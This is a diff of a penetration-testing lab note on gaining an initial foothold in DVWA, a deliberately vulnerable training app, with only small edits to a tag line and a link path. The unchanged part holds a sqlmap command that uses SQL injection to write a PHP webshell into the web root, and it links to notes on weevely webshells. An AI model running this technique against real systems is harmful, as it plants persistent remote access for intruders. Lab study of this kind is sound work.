@@ -1,6 +1,6 @@
 # 05 - Initial Foothold
 
-Search Tag: #sql-injection #sqlmap #initial-foothold #persistence #webshell #dvwa
+Search Tag(s): #sql-injection #sqlmap #initial-foothold #persistence #webshell #dvwa
 
 ## 5.1 - Webshell
 
@@ -12,7 +12,7 @@ Search Tag: #sql-injection #sqlmap #initial-foothold #persistence #webshell #dvw
 
 ### 5.1.2 - Upload a specific Webshell
 
-Refer to this [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Callback Shells/Webshells/Webshells|link]] to generate interactive weevely webshells and click [[Command and Control/Webshells/01 - Help Menu|here]] for post exploitation section.
+Refer to this [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Callback Shells/Webshells/Webshells|link]] to generate interactive weevely webshells and click [[Command and Control/Webshells/Weevely/01 - Help Menu|here]] for post exploitation section.
 
 ```
 $ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
